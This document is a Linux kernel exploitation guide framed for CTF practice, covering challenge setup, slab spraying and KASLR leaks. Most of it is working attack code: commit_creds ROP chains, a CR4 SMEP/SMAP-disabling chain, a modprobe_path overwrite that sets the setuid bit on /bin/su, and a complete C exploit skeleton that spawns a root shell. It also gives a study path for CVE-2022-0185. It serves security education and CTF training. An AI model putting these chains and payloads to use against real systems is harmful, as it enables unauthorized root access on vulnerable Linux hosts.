# Kernel Pwn

## Environment preparation

A typical kernel challenge package:

```text
kernel/
├── bzImage          # compressed kernel image
├── vmlinux          # uncompressed kernel (with symbols, for gdb)
├── initramfs.cpio.gz / rootfs.img
├── vuln.ko          # vulnerable driver
├── run.sh           # qemu launch script
└── (.config)        # build config, optional
```

### Unpack initramfs and modify the init script

```bash
mkdir initramfs && cd initramfs
zcat ../initramfs.cpio.gz | cpio -idm
# or newc format:
# cpio -idm < ../initramfs.cpio

# Modify init to get root (for CTF practice; real challenges usually setuid 1000)
sed -i 's|setuidgid 1000|setuidgid 0|g' init
# or comment out the user-switch line

# Repack
find . | cpio -o --format=newc | gzip > ../initramfs.cpio.gz
cd ..
```

### Extract vmlinux (if only bzImage is given)

```bash
# Use the extract-vmlinux script (kernel source scripts/)
/usr/src/linux/scripts/extract-vmlinux ./bzImage > vmlinux
```

### QEMU launch parameter template

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 256M \
    -kernel ./bzImage \
    -initrd ./initramfs.cpio.gz \
    -cpu kvm64,+smep,+smap \
    -append "console=ttyS0 nokaslr quiet oops=panic panic=1" \
    -monitor /dev/null \
    -nographic \
    -no-reboot \
    -s    # open gdb port 1234
```

Protections corresponding to the key parameters:

| Parameter | Meaning | Impact on exploitation |
|------|------|---------|
| `+smep` | kernel cannot execute userland code | must use ROP, cannot jump to userland shellcode |
| `+smap` | kernel cannot access userland data | the rop chain cannot live in userland, must be in kernel space (heap spray / msgsnd) |
| `+pku` | Protection Keys | similar to SMAP |
| `nokaslr` | KASLR disabled | function addresses are fixed |
| `kaslr` | KASLR enabled | must leak |
| `pti=on` | KPTI (Meltdown fix) | returning to userland requires swapgs_restore_regs_and_return_to_usermode |

### Debugging

```bash
# terminal 1
./run.sh   # with -s

# terminal 2
gdb vmlinux
(gdb) target remote :1234
(gdb) b vulnerable_ioctl
(gdb) c
```

For GEF, the fork maintained by bata24 is recommended; it has dedicated pretty-printers for kernel structures.

## Vulnerability type branching

| Vulnerability | Typical source | Exploitation baseline |
|------|---------|---------|
| Kernel stack overflow | copy_from_user with controllable length | stack canary + KASLR → ROP |
| Kernel heap overflow | kmalloc slab out-of-bounds write | slab spray + overwrite adjacent object |
| UAF | refcount bug / double free | reallocate same slab → control the freed object |
| Integer overflow | size computation overflows → small alloc, large copy | actually an overflow, same as above |
| TOCTOU | userland pointer dereferenced twice | userfaultfd / FUSE to stall time |
| race | two threads ioctl simultaneously | win the timing window |
| Arbitrary read/write | already the ultimate primitive | directly modify cred / modprobe_path |

## Slab spraying (core of heap pwn)

Spray kernel objects of controllable size onto the vulnerable slab to overwrite the target object.

| slab size | Spray object | Advantage |
|-----------|---------|------|
| kmalloc-64 / 96 | `seq_operations` | has function pointers, overwrite = control IP |
| kmalloc-1024 | `tty_struct` | has an ops pointer, beautiful structure |
| kmalloc-4096 | `pipe_buffer` | the modern workhorse, still works on 6.x |
| any size | `msg_msg` | controllable size (8 - 4096+), sysv msgsnd controls data |
| kmalloc-128 | `user_key_payload` | keyctl family of interfaces |

### msg_msg spray example

```c
// triggered from userland
int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

struct {
    long mtype;
    char mtext[0x80 - 0x30];  // plus the 0x30 msg_msg header = kmalloc-128
} msg = { .mtype = 0x1337 };
memset(msg.mtext, 'A', sizeof(msg.mtext));

msgsnd(msqid, &msg, sizeof(msg.mtext), 0);   // spray into kmalloc-128
// ... trigger the vulnerability to overwrite
msgrcv(msqid, &msg, sizeof(msg.mtext), 0, 0); // read back to see if it changed → leak
```

## Privilege escalation paths

### 1. commit_creds(prepare_kernel_cred(0)) ROP

Classic and universal. Prerequisite: can control RIP (stack overflow / vtable hijack).

```c
// userland ROP chain
uint64_t rop[] = {
    pop_rdi,                          // pop rdi; ret
    0,                                // arg: 0
    prepare_kernel_cred,              // → returns root cred in rax
    pop_rdi,                          // pop rdi; ret
    /* placeholder, overwritten by the mov below */ 0,
    /* mov rdi, rax; ... ; ret */ 0,  // move rax→rdi (some require a dedicated gadget)
    commit_creds,                     // set current process cred = root
    swapgs_restore_regs_and_return_to_usermode + 22,  // skip the push sequence
    0, 0,                             // rax, rdi placeholders
    user_rip,                         // userland return function (saved cs/ss)
    user_cs, user_rflags, user_rsp, user_ss,
};
```

**Key gadgets** (find them in vmlinux with ROPgadget):

```bash
ROPgadget --binary vmlinux --only "pop|ret" | grep 'pop rdi'
ROPgadget --binary vmlinux --only "mov|ret" | grep 'mov rdi, rax'
```

cs/ss/rflags/rsp must be saved before returning to userland:

```c
void save_state() {
    __asm__(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp));
}
void shell() { system("/bin/sh"); }
```

### 2. Change modprobe_path to /tmp/x (easiest)

```text
Principle:
  - The kernel global modprobe_path defaults to "/sbin/modprobe"
  - When execve hits a file with an unknown magic, the kernel invokes modprobe_path as root
  - Change it to "/tmp/x", write /tmp/x (chmod +x), trigger an unknown-magic exec
  
Applies to: when you have an arbitrary-write primitive but cannot necessarily ROP
```

```c
// 1. Prepare the payload
system("echo -e '#!/bin/sh\nchmod +s /bin/su' > /tmp/x");
system("chmod +x /tmp/x");

// 2. Prepare the trigger file
system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/trigger");
system("chmod +x /tmp/trigger");

// 3. Vulnerability write: change modprobe_path to "/tmp/x\x00"
arbitrary_write(modprobe_path_addr, "/tmp/x\x00");

// 4. Trigger
system("/tmp/trigger");
// the kernel runs /tmp/x as root, which did chmod +s /bin/su

// 5. Abuse setuid
system("/bin/su");
```

**modprobe_path address source**: a symbol in vmlinux, or /proc/kallsyms (if kptr_restrict=0).

### 3. core_pattern hijack

```text
Similar idea: /proc/sys/kernel/core_pattern controls the coredump handler
Change it to "|/tmp/x %P" so it is invoked when a process crashes
Downside: needs to trigger a coredump, clumsier than modprobe_path
```

### 4. Kernel ROP to disable SMEP/SMAP

If you insist on jumping back to userland shellcode (for learning purposes), you can ROP to clear bits in cr4:

```c
// CR4: SMEP = bit 20, SMAP = bit 21
// After disabling SMEP+SMAP, jumping to userland shellcode can run
uint64_t rop[] = {
    pop_rdi,
    0x6f0,                  // expected CR4 value (SMEP/SMAP bits removed)
    mov_cr4_rdi,            // something like "mov cr4, rdi; pop rbp; ret"
    0,
    user_shellcode_addr,    // jump there (this step fails if SMEP is still on)
};
```

In reality **real exploitation barely uses this path** — a direct commit_creds ROP is shorter and more reliable.

## KASLR leak channels

| Source | Limitation | Notes |
|------|------|------|
| /proc/kallsyms | real addresses only when `kptr_restrict=0` | often open in CTF |
| /sys/module/.../sections/.text | same as above | module base |
| dmesg | readable only when `dmesg_restrict=0` | oops leaks addresses |
| kernel stack uninitialized read | the vulnerability itself must allow arbitrary read | residual addresses |
| msg_msg + vulnerability leak | OOB read after spraying | universal |
| Side channels (Meltdown/Spectre) | KPTI fixed Meltdown | not universal |
| SIDT/SGDT userland instructions | older kernels may leak | mostly closed on modern ones |

```c
// classic: read from /proc/kallsyms
FILE *f = fopen("/proc/kallsyms", "r");
char line[256];
unsigned long commit_creds = 0;
while (fgets(line, sizeof(line), f)) {
    if (strstr(line, " commit_creds")) {
        commit_creds = strtoul(line, NULL, 16);
        break;
    }
}
unsigned long kbase = commit_creds - 0xXXXXX;  // the offset depends on vmlinux
```

## Complete exploit template (userland + ioctl trigger + ROP privilege escalation + shell)

```c
// exploit.c — generic kernel pwn skeleton
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

static unsigned long user_cs, user_ss, user_rflags, user_rsp;

static void save_state(void) {
    __asm__ volatile(
        "movq %%cs,   %0\n"
        "movq %%ss,   %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp,  %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
        :: "memory");
}

static void win(void) {
    if (getuid() == 0) {
        puts("[+] root!");
        system("/bin/sh");
    } else {
        puts("[-] not root");
    }
    exit(0);
}

// === KASLR base (leak it first, or hard-code when nokaslr) ===
#define KBASE_DEFAULT  0xffffffff81000000UL
#define OFF_COMMIT_CREDS         0x0xxxxx
#define OFF_PREPARE_KERNEL_CRED  0x0xxxxx
#define OFF_POP_RDI              0x0xxxxx
#define OFF_MOV_RDI_RAX          0x0xxxxx
#define OFF_SWAPGS_RESTORE       0x0xxxxx

int main(void) {
    save_state();

    // 1. leak the KASLR base (here we assume /proc/kallsyms is readable, or write your own leak primitive)
    unsigned long kbase = leak_kbase();

    unsigned long prepare_kernel_cred = kbase + OFF_PREPARE_KERNEL_CRED;
    unsigned long commit_creds        = kbase + OFF_COMMIT_CREDS;
    unsigned long pop_rdi             = kbase + OFF_POP_RDI;
    unsigned long mov_rdi_rax         = kbase + OFF_MOV_RDI_RAX;
    unsigned long swapgs_restore      = kbase + OFF_SWAPGS_RESTORE + 22;

    // 2. Build the ROP (on the user stack or on a sprayed fake stack)
    unsigned long *rop = mmap((void*)0x100000, 0x1000,
                              PROT_READ|PROT_WRITE,
                              MAP_PRIVATE|MAP_ANON|MAP_FIXED, -1, 0);
    int i = 0;
    rop[i++] = pop_rdi;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = mov_rdi_rax;
    rop[i++] = commit_creds;
    rop[i++] = swapgs_restore;
    rop[i++] = 0;  // rax
    rop[i++] = 0;  // rdi
    rop[i++] = (unsigned long)win;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = (unsigned long)(rop + 100);  // temporary user rsp, can point high in the mmap
    rop[i++] = user_ss;

    // 3. Trigger the vulnerability so the kernel RIP lands on rop[0]
    int fd = open("/dev/vuln", O_RDWR);
    trigger(fd, rop);   // challenge-specific: ioctl / write / read

    return 0;
}
```

## Learning reference: CVE-2022-0185

```text
Vulnerability: signed/unsigned confusion in the length computation of legacy_parse_param in fs/fs_context.c
      → kmalloc heap buffer overflow, arbitrary size, arbitrary data

Why it is a good learning sample:
1. No root required to trigger (unprivileged user namespace)
2. The overflow size is fully controllable
3. Complete public writeups + PoCs exist
4. Combines: user_ns exploitation, msg_msg spraying, UAF re-occupation, cross-cache exploitation

Learning path:
1. Compile a kernel with CONFIG_USER_NS=y
2. Run the original PoC by Crusaders of Rust: https://www.openwall.com/lists/oss-security/2022/01/18/7
3. Read the official writeup on willsroot.io (the version collected by PortSwigger)
4. Rewrite it by hand: change the msg_msg spray into a pipe_buffer spray version (practice a different slab path)
5. Add a KASLR leak (the original uses /proc/kallsyms; the challenge version disables it, switch to OOB read)
```

The main techniques map to this document's sections:

- Vulnerability type → "Kernel heap overflow"
- Spray object → "msg_msg spraying"
- Privilege escalation method → "commit_creds ROP" or "modprobe_path"
- KASLR leak → "/proc/kallsyms" or "msg_msg + vulnerability leak"

## Notes

- **CONFIG_RANDOM_KSTACK_OFFSET / RANDOMIZE_KSTACK_OFFSET_DEFAULT** randomizes the kernel stack base by 0-1023 on every syscall, breaking all exploits that depend on a fixed stack offset
- **CONFIG_SLAB_FREELIST_RANDOM / HARDENED** randomizes object allocation inside a slab, lowering the spray success rate, so spray more
- **CONFIG_STATIC_USERMODEHELPER** makes modprobe_path read-only as `static_usermodehelper_path`, killing the modprobe attack
- **KPTI** separates userland/kernel page tables; returning to userland must go through the `swapgs_restore_regs_and_return_to_usermode` trampoline, a direct swapgs+iretq is not possible
- **FG-KASLR** (function-granular KASLR) randomizes at function granularity, you must leak multiple symbols to derive each function offset
- **CET / IBT** (Intel control-flow enforcement) requires indirect jumps to land on ENDBR instructions, invalidating some gadgets
- **Do not call printk to output tests inside the kernel** — serial IO changes timing and breaks races; debug with a magic register value (rcx=0xdeadbeef) + a gdb watchpoint
